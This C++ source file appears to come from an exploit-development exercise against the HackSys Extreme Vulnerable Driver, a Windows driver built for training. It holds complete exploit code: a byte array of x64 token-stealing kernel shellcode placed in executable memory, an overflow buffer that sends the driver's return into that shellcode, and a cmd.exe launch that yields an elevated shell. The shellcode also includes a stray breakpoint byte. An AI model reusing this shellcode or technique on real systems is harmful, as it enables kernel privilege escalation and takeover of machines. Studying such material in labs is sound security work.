#include "hevd.h"

VOID HEVD::BufferOverflowStack(BOOLEAN debug)
{
	do {
		// Token stealing shellcode on Windows 10 VM (x64)
		BYTE payload[] =
		{
			0x52, 0x41, 0x50, 0x41, 0x51, 0x48, 0x31, 0xC0, 0x65, 0x48, 0x8B, 0x14,
			0x25, 0x88, 0x01, 0x00, 0x00, 0x4C, 0x8B, 0x82, 0xB8, 0x00, 0x00, 0x00,
			0x4D, 0x8B, 0x88, 0x48, 0x04, 0x00, 0x00, 0x49, 0x8B, 0x09, 0x48, 0x8B,
			0x51, 0xF8, 0x48, 0x83, 0xFA, 0x04, 0x74, 0x09, 0x48, 0x8B, 0x09, 0x4C,
			0x39, 0xC9, 0x75, 0xEE, 0xCC, 0x48, 0x8B, 0x41, 0x70, 0x24, 0xF0, 0x49,
			0x89, 0x80, 0xB8, 0x04, 0x00, 0x00, 0x48, 0x31, 0xF6, 0x48, 0x31, 0xFF,
			0x4D, 0x31, 0xFF, 0x4D, 0x31, 0xF6, 0x4D, 0x31, 0xE4, 0x48, 0x31, 0xC0,
			0x48, 0x83, 0xC4, 0x28, 0x5A, 0x41, 0x58, 0x41, 0x59, 0xC3
		};

		// Create executable memory region to store token stealing shellcode
		LPVOID Alloc = VirtualAlloc(NULL, sizeof(payload), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (!Alloc) {
			if (debug)
				std::printf("[-] Error - Unable to allocate shellcode.\n");
			break;
		}

		if (debug)
			std::printf("[+] Successfully created executable memory region for payload at: 0x%p\n", Alloc);

		// Copy the token stealing shellcode into the executable memory region created by VirtalAlloc()
		RtlMoveMemory(Alloc, payload, sizeof(payload));
		if (debug)
			std::printf("[+] Copied payload to executable memory\n");

		// Declare 'bytesRet' variable for 'DeviceIoControl->lpBytesReturned' parameter
		DWORD bytesRet;

		// Buffer to driver
		BYTE buffer[0x820] = { 0 };
		// Offset to stack
		const size_t offset = 0x818;

		// Fill 'expl' with 'A's
		memset(buffer, '\x41', offset);
		// Set end of the buffer to our address of our executable region
		memcpy(buffer + offset, (PUINT64)&Alloc, 8);

		// Interact with vulnerable "\\\\.\\HackSysExtremeVulnerableDriver" driver
		if (debug)
			std::printf("[+] Starting interaction with the driver\n");
		DeviceIoControl(HEVD::GetHandleToDevice(FALSE), HEVD::IO_CODE_BUFFER_OVERFLOW, &buffer, sizeof(buffer), NULL, 0, &bytesRet, NULL);
		system("cmd.exe");
	} while (0);
}
